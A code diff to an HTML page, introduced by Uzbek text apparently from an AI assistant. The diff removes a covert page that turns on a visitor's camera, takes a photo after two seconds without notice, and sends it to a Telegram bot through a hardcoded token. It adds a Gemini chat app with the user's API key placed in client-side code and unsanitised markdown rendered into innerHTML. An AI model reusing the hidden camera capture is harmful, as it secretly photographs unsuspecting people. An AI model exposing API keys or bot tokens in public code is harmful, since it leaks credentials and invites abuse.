@@ -1,62 +1,374 @@
+Zo'r! Mana shu tashlagan kalitingiz AQ.Ab8RN6JviSwegrM-NvuNJPFJgPlnYwHIjnygMUnAtSZeBN7ReA bilan Zeed AI ilovamiz to'liq tayyor bo'ladi.
+
+Quyida ilovaning to'liq, o'zingizning API kalitingiz o'rnatilgan yakuniy kodi keltirilgan. Uni butunlay nusxalab, faylingizga (masalan, index.html) joylab qo'yasiz:
+
+HTML
 <!DOCTYPE html>
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <title>Sinov</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeed AI</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Marked.js for Markdown parsing -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Custom scrollbar for clean UI */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e293b;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #475569;
+            border-radius: 3px;
+        }
+        .message-content pre {
+            background-color: #0f172a;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 0.5rem;
+            overflow-x: auto;
+        }
+        .message-content code {
+            font-family: monospace;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.25rem;
+        }
+        .message-content pre code {
+            background-color: transparent;
+            padding: 0;
+        }
+    </style>
 </head>
-<body>
+<body class="bg-slate-950 text-slate-100 h-screen flex overflow-hidden">
 
-    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <!-- Sidebar -->
+    <aside id="sidebar" class="w-72 bg-slate-900 border-r border-slate-800 flex flex-col transition-all duration-300 z-20">
+        <div class="p-4 border-b border-slate-800 flex items-center justify-between">
+            <span class="font-bold text-lg tracking-wide flex items-center gap-2">
+                <i class="fa-solid fa-wand-magic-sparkles text-indigo-400"></i> Zeed AI
+            </span>
+            <button onclick="toggleSidebar()" class="text-slate-400 hover:text-white md:hidden">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+        </div>
+        
+        <div class="p-3">
+            <button onclick="startNewChat()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-2.5 px-4 rounded-xl transition flex items-center justify-center gap-2 shadow-lg shadow-indigo-600/20">
+                <i class="fa-solid fa-plus"></i> Yangi suhbat
+            </button>
+        </div>
 
+        <!-- Chat History List -->
+        <div id="chatHistoryList" class="flex-1 overflow-y-auto p-3 space-y-2 text-sm text-slate-300">
+            <!-- Dynamically populated -->
+        </div>
+
+        <div class="p-4 border-t border-slate-800 text-xs text-slate-500 flex items-center justify-between">
+            <span>Zeed AI v1.0</span>
+            <span class="text-emerald-400 flex items-center gap-1"><i class="fa-solid fa-circle text-[8px]"></i> Online</span>
+        </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 flex flex-col h-full bg-slate-950 relative">
+        
+        <!-- Header -->
+        <header class="h-16 border-b border-slate-800 bg-slate-900/50 backdrop-blur flex items-center justify-between px-4 z-10">
+            <div class="flex items-center gap-3">
+                <button onclick="toggleSidebar()" class="text-slate-400 hover:text-white p-2 rounded-lg hover:bg-slate-800 transition">
+                    <i class="fa-solid fa-bars text-lg"></i>
+                </button>
+                <h1 id="currentChatTitle" class="font-semibold text-slate-200">Yangi suhbat</h1>
+            </div>
+            <div class="flex items-center gap-2">
+                <button onclick="clearCurrentChat()" title="Suhbatni tozalash" class="text-slate-400 hover:text-red-400 p-2 rounded-lg hover:bg-slate-800 transition">
+                    <i class="fa-solid fa-trash-can"></i>
+                </button>
+            </div>
+        </header>
+
+        <!-- Chat Messages Container -->
+        <div id="chatContainer" class="flex-1 overflow-y-auto p-4 md:p-6 space-y-6">
+            <!-- Welcome Screen / Empty State -->
+            <div id="welcomeScreen" class="h-full flex flex-col items-center justify-center text-center max-w-md mx-auto space-y-4">
+                <div class="w-16 h-16 bg-indigo-600/10 border border-indigo-500/20 rounded-2xl flex items-center justify-center text-indigo-400 text-2xl shadow-xl">
+                    <i class="fa-solid fa-robot"></i>
+                </div>
+                <h2 class="text-xl font-bold text-white">Assalomu alaykum! Men Zeed AIman.</h2>
+                <p class="text-sm text-slate-400">Bugun sizga qanday yordam bera olaman? Istalgan savolingizni bering.</p>
+            </div>
+        </div>
+
+        <!-- Input Area -->
+        <div class="p-4 bg-slate-950 border-t border-slate-800">
+            <div class="max-w-4xl mx-auto relative flex items-center">
+                <textarea id="userInput" rows="1" placeholder="Zeed AI ga xabar yozing..." 
+                    class="w-full bg-slate-900 text-slate-100 placeholder-slate-500 rounded-2xl pl-4 pr-14 py-3.5 border border-slate-800 focus:border-indigo-500 focus:outline-none resize-none max-h-32 shadow-inner"
+                    onkeydown="handleKeyDown(event)"></textarea>
+                <button onclick="sendMessage()" id="sendButton" class="absolute right-2.5 bg-indigo-600 hover:bg-indigo-500 text-white w-10 h-10 rounded-xl flex items-center justify-center transition shadow-md">
+                    <i class="fa-solid fa-paper-plane text-sm"></i>
+                </button>
+            </div>
+            <div class="text-center mt-2">
+                <span class="text-[11px] text-slate-500">Zeed AI — Gemini texnologiyasi asosida ishlaydi.</span>
+            </div>
+        </div>
+    </main>
+
+    <!-- JavaScript Logic -->
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        // API Configuration (Gemini 1.5 Flash)
+        const API_KEY = "AQ.Ab8RN6JviSwegrM-NvuNJPFJgPlnYwHIjnygMUnAtSZeBN7ReA";
+        const API_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`;
 
-        // 1. Kamerani ishga tushirish
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // Sahifa ochilib, kamera yoqilgandan keyin 2 sekund o'tib avtomatik rasmga oladi
-                setTimeout(takeAndSendPhoto, 2000);
-            })
-            .catch(err => {
-                console.error("Kameraga ruxsat berilmadi: ", err);
-            });
+        let chats = JSON.parse(localStorage.getItem('zeed_ai_chats')) || [];
+        let currentChatId = localStorage.getItem('zeed_ai_current_chat_id') || null;
 
-        // 2. Suratga olib botga yuborish funksiyasi
-        function takeAndSendPhoto() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Initialize App
+        document.addEventListener('DOMContentLoaded', () => {
+            if (chats.length === 0) {
+                startNewChat();
+            } else {
+                if (!currentChatId || !chats.find(c => c.id == currentChatId)) {
+                    currentChatId = chats[0].id;
+                }
+                loadChat(currentChatId);
+            }
+            renderChatHistoryList();
+        });
 
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-            }, 'image/png');
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('-ml-72');
         }
 
-        // 3. Telegram API'ga yuborish
-        function sendToTelegram(blob) {
-            const BOT_TOKEN = '8971586107:AAFEVSMoD1GyxZ9ScYbhT4rXPtZ6sYpdsAA';
-            const CHAT_ID = 'O‘ZINGIZNING_CHAT_IDINGIZNI_YOZING'; // Masalan: 123456789
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.png');
+        function startNewChat() {
+            const newChat = {
+                id: Date.now(),
+                title: 'Yangi suhbat',
+                messages: []
+            };
+            chats.unshift(newChat);
+            currentChatId = newChat.id;
+            saveAndRefresh();
+            renderChatHistoryList();
+            showWelcomeIfNeeded();
+        }
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Rasm muvaffaqiyatli yuborildi!', data);
-            })
-            .catch(error => {
-                console.error('Xatolik yuz berdi:', error);
+        function saveAndRefresh() {
+            localStorage.setItem('zeed_ai_chats', JSON.stringify(chats));
+            localStorage.setItem('zeed_ai_current_chat_id', currentChatId);
+        }
+
+        function getCurrentChat() {
+            return chats.find(c => c.id == currentChatId);
+        }
+
+        function renderChatHistoryList() {
+            const listEl = document.getElementById('chatHistoryList');
+            listEl.innerHTML = '';
+            chats.forEach(chat => {
+                const isActive = chat.id == currentChatId;
+                const div = document.createElement('div');
+                div.className = `p-2.5 rounded-xl cursor-pointer truncate transition flex items-center justify-between group ${isActive ? 'bg-slate-800 text-white font-medium' : 'hover:bg-slate-900/80 text-slate-400 hover:text-slate-200'}`;
+                div.innerHTML = `
+                    <span onclick="switchChat(${chat.id})" class="truncate flex-1"><i class="fa-regular fa-message mr-2 text-xs"></i>${chat.title}</span>
+                    <button onclick="deleteChat(event, ${chat.id})" class="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400 px-1.5"><i class="fa-solid fa-xmark text-xs"></i></button>
+                `;
+                listEl.appendChild(div);
             });
+        }
+
+        function switchChat(id) {
+            currentChatId = id;
+            saveAndRefresh();
+            renderChatHistoryList();
+            loadChat(id);
+        }
+
+        function deleteChat(event, id) {
+            event.stopPropagation();
+            chats = chats.filter(c => c.id != id);
+            if (chats.length === 0) {
+                startNewChat();
+            } else if (currentChatId == id) {
+                currentChatId = chats[0].id;
+                loadChat(currentChatId);
+            }
+            saveAndRefresh();
+            renderChatHistoryList();
+        }
+
+        function clearCurrentChat() {
+            const chat = getCurrentChat();
+            if (chat) {
+                chat.messages = [];
+                chat.title = 'Yangi suhbat';
+                saveAndRefresh();
+                loadChat(currentChatId);
+                renderChatHistoryList();
+            }
+        }
+
+        function loadChat(id) {
+            currentChatId = id;
+            const chat = getCurrentChat();
+            const container = document.getElementById('chatContainer');
+            const titleEl = document.getElementById('currentChatTitle');
+            
+            titleEl.textContent = chat ? chat.title : 'Yangi suhbat';
+            container.innerHTML = '';
+
+            if (!chat || chat.messages.length === 0) {
+                showWelcomeIfNeeded();
+                return;
+            }
+
+            chat.messages.forEach(msg => {
+                appendMessageToDOM(msg.role, msg.text, false);
+            });
+            scrollToBottom();
+        }
+
+        function showWelcomeIfNeeded() {
+            const chat = getCurrentChat();
+            const container = document.getElementById('chatContainer');
+            if (!chat || chat.messages.length === 0) {
+                container.innerHTML = `
+                    <div id="welcomeScreen" class="h-full flex flex-col items-center justify-center text-center max-w-md mx-auto space-y-4">
+                        <div class="w-16 h-16 bg-indigo-600/10 border border-indigo-500/20 rounded-2xl flex items-center justify-center text-indigo-400 text-2xl shadow-xl">
+                            <i class="fa-solid fa-robot"></i>
+                        </div>
+                        <h2 class="text-xl font-bold text-white">Assalomu alaykum! Men Zeed AIman.</h2>
+                        <p class="text-sm text-slate-400">Bugun sizga qanday yordam bera olaman? Istalgan savolingizni bering.</p>
+                    </div>
+                `;
+            }
+        }
+
+        function scrollToBottom() {
+            const container = document.getElementById('chatContainer');
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function handleKeyDown(event) {
+            if (event.key === 'Enter' && !event.shiftKey) {
+                event.preventDefault();
+                sendMessage();
+            }
+        }
+
+        async function sendMessage() {
+            const input = document.getElementById('userInput');
+            const text = input.value.trim();
+            if (!text) return;
+
+            input.value = '';
+            input.style.height = 'auto';
+
+            // Remove welcome screen if present
+            const welcome = document.getElementById('welcomeScreen');
+            if (welcome) welcome.remove();
+
+            const chat = getCurrentChat();
+            if (chat.messages.length === 0) {
+                chat.title = text.length > 25 ? text.substring(0, 25) + '...' : text;
+                document.getElementById('currentChatTitle').textContent = chat.title;
+                renderChatHistoryList();
+            }
+
+            // User message
+            appendMessageToDOM('user', text, true);
+            chat.messages.push({ role: 'user', text });
+            saveAndRefresh();
+
+            // Typing indicator / Loading bubble
+            const loadingId = 'loading_' + Date.now();
+            appendLoadingToDOM(loadingId);
+
+            try {
+                // Prepare API history format
+                const contents = chat.messages.map(m => ({
+                    role: m.role === 'user' ? 'user' : 'model',
+                    parts: [{ text: m.text }]
+                }));
+
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ contents })
+                });
+
+                const data = await response.json();
+                document.getElementById(loadingId).remove();
+
+                if (data.candidates && data.candidates[0].content) {
+                    const replyText = data.candidates[0].content.parts[0].text;
+                    appendMessageToDOM('model', replyText, true);
+                    chat.messages.push({ role: 'model', text: replyText });
+                    saveAndRefresh();
+                } else {
+                    throw new Error('Javob olishda xatolik');
+                }
+            } catch (error) {
+                document.getElementById(loadingId).remove();
+                appendMessageToDOM('model', 'Kechirasiz, xatolik yuz berdi. Internet aloqasini yoki API kalitni tekshiring.', true);
+            }
+        }
+
+        function appendMessageToDOM(role, text, scroll = true) {
+            const container = document.getElementById('chatContainer');
+            const isUser = role === 'user';
+            
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `flex gap-3 max-w-4xl mx-auto w-full ${isUser ? 'justify-end' : 'justify-start'}`;
+
+            const avatar = isUser ? '' : `
+                <div class="w-8 h-8 rounded-xl bg-indigo-600 flex items-center justify-center text-white shrink-0 shadow-md">
+                    <i class="fa-solid fa-robot text-xs"></i>
+                </div>
+            `;
+
+            const formattedText = isUser ? escapeHtml(text) : marked.parse(text);
+
+            messageDiv.innerHTML = `
+                ${avatar}
+                <div class="${isUser ? 'bg-indigo-600 text-white rounded-2xl rounded-tr-sm px-4 py-3 max-w-[80%] shadow-md' : 'bg-slate-900 border border-slate-800 text-slate-100 rounded-2xl rounded-tl-sm px-4 py-3 max-w-[85%] shadow-md message-content'}">
+                    ${formattedText}
+                </div>
+            `;
+
+            container.appendChild(messageDiv);
+            if (scroll) scrollToBottom();
+        }
+
+        function appendLoadingToDOM(id) {
+            const container = document.getElementById('chatContainer');
+            const div = document.createElement('div');
+            div.id = id;
+            div.className = 'flex gap-3 max-w-4xl mx-auto w-full justify-start';
+            div.innerHTML = `
+                <div class="w-8 h-8 rounded-xl bg-indigo-600 flex items-center justify-center text-white shrink-0 shadow-md">
+                    <i class="fa-solid fa-robot text-xs"></i>
+                </div>
+                <div class="bg-slate-900 border border-slate-800 text-slate-400 rounded-2xl rounded-tl-sm px-4 py-3 flex items-center gap-2">
+                    <i class="fa-solid fa-circle-notch animate-spin text-indigo-400"></i> Zeed AI o'ylamoqda...
+                </div>
+            `;
+            container.appendChild(div);
+            scrollToBottom();
+        }
+
+        function escapeHtml(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         }
     </script>
-
 </body>
 </html>
